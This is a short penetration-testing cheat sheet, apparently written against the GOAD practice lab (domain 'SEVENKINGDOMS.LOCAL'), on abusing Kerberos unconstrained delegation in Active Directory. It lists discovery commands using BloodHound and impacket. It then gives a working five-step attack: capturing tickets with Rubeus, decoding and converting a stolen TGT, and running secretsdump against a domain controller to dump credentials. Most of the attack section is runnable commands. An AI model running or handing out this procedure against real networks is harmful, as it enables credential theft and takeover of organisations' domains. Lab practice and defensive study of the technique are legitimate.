# Kerberos Unconstrained Delegation (KUD)

If an account with unconstrained delegations privileges is compromised, an attacker can wait for a privileged user to authenticate on it (or forcing it) using Kerberos. The attacker can then retrieve a ticket and use it on the internal network. 

# Find this configuration

```
    MATCH (c {unconstraineddelegation:true}) return c
```
```
    impacket-findDelegation
```
```
    bloodhound
```

# Exploit it

1) with Rubeus on the target:

```
Rubeus.exe monitor /interval:5
```

2) Copy the obtained ticket, without space and return line, in vim you can do:
```
%s/\s*\n\s*//g
```
3) Decode the b64 ticket to get a kirby format:
```
cat tgt.b64|base64 -d > ticket.kirbi
```
4) Convert kirbi ticket:
``` 
ticketConverter.py ticket.kirbi ticket.ccache
```
5) Use this ticket
```
export KRB5CCNAME=ticket.ccache
secretsdump.py -k -no-pass SEVENKINGDOMS.LOCAL/'KINGSLANDING$'@KINGSLANDING
```

# Notes: 

By default on AD all domain controller are setup with unconstrained delegation.

